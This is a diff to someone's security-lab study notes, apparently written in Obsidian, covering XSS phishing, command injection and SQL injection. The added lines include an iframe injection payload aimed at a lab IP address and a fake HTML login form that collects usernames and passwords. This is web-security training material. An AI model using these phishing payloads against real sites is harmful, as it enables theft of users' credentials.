@@ -18,6 +18,22 @@
 7) # Phishing with XSS
    - ![[Pasted image 20241022110334.png]]
    - `<iframe frameborder=0 width=400 height=200 src="내가 만든 피싱 주소"></iframe>`
-1) String SQL Injection
+     `<iframe frameborder=0 width=400 height=200 src=http://192.168.56.102/>`
+```html
+User Authentication
+<p>
+<form id=id action=/ method=GET>
+	Username<br>
+	<input type=text name=id><br>
+	Password<br>
+	<input type=password name=pw><br>
+	<input type=submit value=Login onclick="document.getElementById('id').submit()">
+</form>
+```
+8) # Command Injection
+   ![[Pasted image 20241022112010.png]]
+   - 
+1) 
+2) String SQL Injection
 ![[Pasted image 20241022093320.png]]
 2) 
